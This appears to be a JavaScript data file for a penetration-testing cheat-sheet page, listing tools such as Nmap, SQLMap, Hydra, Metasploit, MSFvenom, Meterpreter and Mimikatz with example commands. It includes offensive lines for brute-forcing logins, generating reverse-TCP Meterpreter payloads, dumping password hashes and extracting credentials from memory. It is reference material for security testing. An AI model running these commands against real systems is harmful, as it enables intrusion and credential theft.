// Comprehensive Security Tools Database with Commands and Detailed Descriptions
const toolsDatabase = {
  categories: [
    "Information Gathering",
    "Vulnerability Analysis",
    "Web Application Analysis",
    "Password Attacks",
    "Wireless Attacks",
    "Exploitation Tools",
    "Sniffing & Spoofing",
    "Post Exploitation"
  ],
  
  tools: [
    // Information Gathering
    {
      id: "nmap",
      name: "Nmap",
      description: "Powerful network discovery and security auditing tool that uses raw IP packets to determine available hosts, services, operating systems, packet filters/firewalls, and other characteristics.",
      category: "Information Gathering",
      commands: [
        { cmd: "nmap 192.168.1.1", desc: "Basic scan of a single IP" },
        { cmd: "nmap -sV -sC 192.168.1.0/24", desc: "Service version detection and default scripts" },
        { cmd: "nmap -p 1-1000 192.168.1.1", desc: "Scan specific port range" },
        { cmd: "nmap -A 192.168.1.1", desc: "Aggressive scan (OS detection, version, scripts, traceroute)" }
      ],
      docs: "https://www.stationx.net/nmap-cheat-sheet/"
    },
    {
      id: "whois",
      name: "Whois",
      description: "Query tool that returns information about domain name registration records, including ownership details, name servers, and registration dates.",
      category: "Information Gathering",
      commands: [
        { cmd: "whois example.com", desc: "Basic whois lookup for a domain" },
        { cmd: "whois -h whois.arin.net 8.8.8.8", desc: "Query specific whois server for IP information" }
      ],
      docs: "https://www.geeksforgeeks.org/whois-command-in-linux-with-examples/"
    },
    {
      id: "dnsenum",
      name: "DNSenum",
      description: "Perl script that enumerates DNS information of a domain, including host addresses, name servers, MX records, and attempts zone transfers.",
      category: "Information Gathering",
      commands: [
        { cmd: "dnsenum example.com", desc: "Basic DNS enumeration" },
        { cmd: "dnsenum --threads 10 -s 0 --noreverse example.com", desc: "Threaded enumeration without reverse lookups" }
      ],
      docs: "https://www.kali.org/tools/dnsenum/"
    },
    {
      id: "recon-ng",
      name: "Recon-ng",
      description: "Full-featured reconnaissance framework with modules for web-based open source intelligence gathering.",
      category: "Information Gathering",
      commands: [
        { cmd: "recon-ng", desc: "Start Recon-ng" },
        { cmd: "marketplace search", desc: "Search for modules" },
        { cmd: "marketplace install all", desc: "Install all modules" },
        { cmd: "modules load recon/domains-hosts/google_site_web", desc: "Load a specific module" },
        { cmd: "info", desc: "Show module info" },
        { cmd: "options set SOURCE example.com", desc: "Set options" },
        { cmd: "run", desc: "Run the module" }
      ],
      docs: "https://github.com/lanmaster53/recon-ng"
    },
    
    // Web Application Analysis
    {
      id: "burpsuite",
      name: "Burp Suite",
      description: "Integrated platform for performing security testing of web applications. It contains various tools for intercepting proxy traffic, scanning for vulnerabilities, and manipulating requests.",
      category: "Web Application Analysis",
      commands: [
        { cmd: "# Proxy setup (in browser): 127.0.0.1:8080", desc: "Configure browser to use Burp proxy" },
        { cmd: "# Intercept requests: Proxy > Intercept > Intercept is on", desc: "Start intercepting HTTP(S) traffic" },
        { cmd: "# Send to repeater: Right-click > Send to Repeater", desc: "Send request to Repeater for manipulation" },
        { cmd: "# Active scanning: Right-click > Scan", desc: "Perform active vulnerability scan" }
      ],
      docs: "https://portswigger.net/burp/documentation/desktop"
    },
    {
      id: "sqlmap",
      name: "SQLMap",
      description: "Automated SQL injection and database takeover tool that can detect and exploit SQL injection vulnerabilities in web applications.",
      category: "Web Application Analysis",
      commands: [
        { cmd: "sqlmap -u \"http://example.com/page.php?id=1\"", desc: "Basic scan of a URL" },
        { cmd: "sqlmap -u \"http://example.com/page.php?id=1\" --dbs", desc: "Enumerate databases" },
        { cmd: "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname --tables", desc: "List tables in a database" },
        { cmd: "sqlmap -u \"http://example.com/page.php?id=1\" --forms", desc: "Test forms automatically" }
      ],
      docs: "https://github.com/sqlmapproject/sqlmap/wiki/Usage"
    },
    
    // Password Attacks
    {
      id: "hydra",
      name: "Hydra",
      description: "Fast and flexible online password cracking tool that supports numerous protocols to attack, including FTP, HTTP, HTTPS, SMB, SSH, and database services.",
      category: "Password Attacks",
      commands: [
        { cmd: "hydra -l admin -P wordlist.txt 192.168.1.1 ssh", desc: "SSH brute force with single username" },
        { cmd: "hydra -L users.txt -P pass.txt 192.168.1.1 ftp", desc: "FTP with multiple users" },
        { cmd: "hydra -l admin -P pass.txt 192.168.1.1 http-post-form \"/login:username=^USER^&password=^PASS^:F=Login failed\"", desc: "HTTP POST form attack" }
      ],
      docs: "https://github.com/frizb/Hydra-Cheatsheet"
    },
    {
      id: "john",
      name: "John the Ripper",
      description: "Fast password cracker for multiple hash types, designed to detect weak passwords. Supports dictionary, brute force, and rule-based attacks.",
      category: "Password Attacks",
      commands: [
        { cmd: "john hashes.txt", desc: "Basic cracking with default options" },
        { cmd: "john --wordlist=passwords.txt hashes.txt", desc: "Using wordlist" },
        { cmd: "john --format=raw-md5 hashes.txt", desc: "Specify hash format" },
        { cmd: "john --show hashes.txt", desc: "Show cracked passwords" }
      ],
      docs: "https://www.openwall.com/john/doc/"
    },
    
    // Exploitation Tools
    {
      id: "metasploit-framework",
      name: "Metasploit Framework",
      description: "Advanced open-source platform for developing, testing, and executing exploits. Contains hundreds of exploits for known vulnerabilities and a suite of tools for penetration testing.",
      category: "Exploitation Tools",
      commands: [
        { cmd: "msfconsole", desc: "Start Metasploit console" },
        { cmd: "search cve:2021", desc: "Search for exploits by CVE" },
        { cmd: "use exploit/multi/handler", desc: "Use a module" },
        { cmd: "set PAYLOAD windows/meterpreter/reverse_tcp", desc: "Set payload" },
        { cmd: "set LHOST 192.168.1.100", desc: "Set local host" },
        { cmd: "exploit", desc: "Run the exploit" }
      ],
      docs: "https://github.com/rapid7/metasploit-framework/wiki"
    },
    {
      id: "msfvenom",
      name: "MSFvenom",
      description: "Payload generator and encoder that combines the functionality of msfpayload and msfencode. Creates custom payloads for various platforms and formats.",
      category: "Exploitation Tools",
      commands: [
        { cmd: "msfvenom -l payloads", desc: "List available payloads" },
        { cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe", desc: "Create Windows executable payload" },
        { cmd: "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > payload.elf", desc: "Create Linux ELF payload" }
      ],
      docs: "https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom"
    },
    
    // Sniffing & Spoofing
    {
      id: "wireshark",
      name: "Wireshark",
      description: "Network protocol analyzer that lets you capture and interactively browse the traffic running on a computer network. Provides detailed protocol information and packet inspection.",
      category: "Sniffing & Spoofing",
      commands: [
        { cmd: "wireshark -i eth0", desc: "Capture on interface eth0" },
        { cmd: "wireshark -i eth0 -w capture.pcap", desc: "Capture to file" },
        { cmd: "wireshark -i eth0 -f \"port 80\"", desc: "Capture with filter" },
        { cmd: "# Display filter: ip.addr == 192.168.1.1", desc: "Filter by IP address" },
        { cmd: "# Display filter: http", desc: "Show only HTTP traffic" }
      ],
      docs: "https://www.comparitech.com/net-admin/wireshark-cheat-sheet/"
    },
    {
      id: "tcpdump",
      name: "tcpdump",
      description: "Command-line packet analyzer that allows you to capture and display TCP/IP and other packets being transmitted or received over a network.",
      category: "Sniffing & Spoofing",
      commands: [
        { cmd: "tcpdump -i eth0", desc: "Capture packets on interface eth0" },
        { cmd: "tcpdump -i eth0 -w capture.pcap", desc: "Write packets to file" },
        { cmd: "tcpdump -i eth0 port 80", desc: "Capture HTTP traffic" },
        { cmd: "tcpdump -i eth0 host 192.168.1.1", desc: "Capture traffic for specific host" }
      ],
      docs: "https://danielmiessler.com/study/tcpdump/"
    },
    
    // Post Exploitation
    {
      id: "meterpreter",
      name: "Meterpreter",
      description: "Advanced, dynamically extensible payload that uses in-memory DLL injection and is extended over the network at runtime. Provides powerful post-exploitation capabilities.",
      category: "Post Exploitation",
      commands: [
        { cmd: "sysinfo", desc: "Get system information" },
        { cmd: "getuid", desc: "Show current user" },
        { cmd: "hashdump", desc: "Dump password hashes" },
        { cmd: "shell", desc: "Get system shell" },
        { cmd: "screenshot", desc: "Take screenshot" },
        { cmd: "download file.txt /path/to/save", desc: "Download file from target" }
      ],
      docs: "https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/"
    },
    {
      id: "mimikatz",
      name: "Mimikatz",
      description: "Powerful post-exploitation tool that extracts plaintexts passwords, hash, PIN codes and kerberos tickets from memory. Also performs pass-the-hash, pass-the-ticket attacks.",
      category: "Post Exploitation",
      commands: [
        { cmd: "privilege::debug", desc: "Get debug privileges" },
        { cmd: "sekurlsa::logonpasswords", desc: "Extract plaintext passwords" },
        { cmd: "lsadump::sam", desc: "Dump local account hashes" },
        { cmd: "kerberos::list", desc: "List Kerberos tickets" }
      ],
      docs: "https://github.com/gentilkiwi/mimikatz"
    }
  ]
};

// Make the database available globally
window.toolsDatabase = toolsDatabase;
